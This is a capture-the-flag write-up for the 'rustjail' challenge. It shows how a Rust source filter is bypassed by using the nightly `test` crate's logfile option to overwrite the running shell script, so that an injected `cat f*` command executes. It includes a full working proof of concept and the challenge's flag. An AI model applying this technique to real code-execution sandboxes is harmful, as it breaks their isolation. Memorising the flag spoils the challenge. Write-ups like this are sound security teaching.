# rustjail

**Category:** Jail
**Event:** b01lers CTF 2026  
**Points:** 494  
**Flag:** `bctf{ts_plow_69d7c9fa7d03800b}`

## Description

> Challenge allows users to submit Rust source code to a remote server, where it is compiled and executed with `cargo run`. The source is filtered against several banned substrings, and the goal is to read the flag stored in a nearby file.

## Overview

This challenge is a restricted Rust jail. User input is written into `src/main.rs`, then compiled and executed. The filter blocks many obvious escape routes, including `unsafe`, `std`, `core`, `alloc`, `include`, `impl`, `macro`, `path`, `flag`, `concat`, `<`, `>`, and `'`.

At first glance this removes the usual options:

- No `unsafe` means no direct FFI calls.
- No `std` means no normal filesystem or process APIs.
- No `include` blocks compile-time file reads.
- No `<` or `>` removes generics and even `=>` in match arms.
- No `'` removes character literals and lifetimes.

The flag is stored in a file named like `flag_<hex>.txt` in the same working directory as the Rust project.

The solution is to avoid reading the flag directly from Rust. Instead, we abuse the test harness to overwrite `runner.sh`, then rely on the parent shell continuing to read that modified script and execute attacker-controlled shell commands.

## Technical details

### Challenge structure

- `wrapper.py`: copies the source into a temporary directory and launches `runner.sh`
- `runner.sh`: sets environment variables, runs `python3 get_payload.py`, then executes `cargo run`
- `get_payload.py`: reads user input, checks the banned substrings, and writes the result into `src/main.rs`
- Rust edition: 2024
- Compiler: nightly Rust

### Key restriction analysis

The main blocker is that all ordinary file-reading paths are cut off. Without `std` or `unsafe`, there is no easy path to `open`, `read`, `system`, or similar functionality.

The useful primitive comes from the built-in `test` crate, which is available from the sysroot:

```rust
#![feature(test)]
extern crate test;
```

The function `test::test_main()` accepts arguments similar to the Rust test harness. One supported option is `--logfile PATH`, which writes test output to an arbitrary file. That gives us an arbitrary file write primitive without using `unsafe` or `std` explicitly.

### Shell script overwrite idea

The target file is `runner.sh`, the same shell script that launched the Rust binary via `cargo run`.

Important behavior:

- `/bin/sh` is currently interpreting `runner.sh`
- it has already read the initial script contents while executing the earlier lines
- after `cargo run` finishes, the shell continues reading from the same file descriptor

The original `runner.sh` is only 372 bytes long. If we overwrite it with a longer file while our binary is still running, the shell's next `read()` happens from byte offset 372. That means any new content appended beyond the old end of file can be interpreted as additional shell commands.

So the goal is simple:

1. Make `test::test_main()` write its output into `runner.sh`
2. Arrange for a newline followed by a command such as `cat f*` to begin exactly at byte 372
3. Exit cleanly and let the parent shell continue execution

### Output layout and padding

The generated test output has a predictable format:

```text
running 1 test
test <NAME> ... ok

test result: ok. 1 passed; 0 failed; ...
```

The test name begins at byte 21, immediately after:

```text
running 1 test\ntest 
```

To make the injected shell command land at byte 372, the chosen test name is:

- 349 bytes of `A`
- followed by `\ncat f*\n`

This places the newline before `cat` exactly where the shell resumes reading. Once the Rust process exits, the shell reads the modified tail of `runner.sh` and executes:

```sh
cat f*
```

That prints the contents of `flag_<hex>.txt`.

## Proof-of-Concept

```rust
#![feature(test)]
extern crate test;

fn main() {
    let name = format!("{}\ncat f*\n", "A".repeat(349));
    let td = test::TestDescAndFn {
        desc: test::TestDesc {
            name: test::DynTestName(name),
            ignore: false,
            ignore_message: None,
            source_file: "",
            start_line: 0,
            start_col: 0,
            end_line: 0,
            end_col: 0,
            should_panic: test::ShouldPanic::No,
            compile_fail: false,
            no_run: false,
            test_type: test::TestType::Unknown,
        },
        testfn: test::DynTestFn(Box::new(|| Ok(()))),
    };

    let args = vec![
        "t".to_string(),
        "--logfile".to_string(),
        "runner.sh".to_string(),
    ];

    test::test_main(&args, vec![td], None);
}
```

### Exploit flow

1. The payload imports the nightly `test` crate.
2. It creates one passing test with a crafted test name containing padding plus `cat f*`.
3. It runs `test::test_main()` with `--logfile runner.sh`.
4. The test harness overwrites `runner.sh` with test output.
5. After `cargo run` exits, the parent shell resumes reading from byte 372.
6. The appended command is executed, printing the flag.

Observed result:

```text
bctf{ts_plow_69d7c9fa7d03800b}
```

## P/S

This was a nice example of escaping a language jail without directly breaking the language restrictions themselves. The intended wall was around Rust syntax and APIs, but the real weakness was in the execution environment:

- the availability of the `test` crate as a write primitive
- the decision to execute user code from inside a shell script
- the shell continuing to read from a script file that can be overwritten during execution

The exploit never needed to call forbidden APIs or read the flag directly from Rust. It only needed to turn the harness behavior against itself.
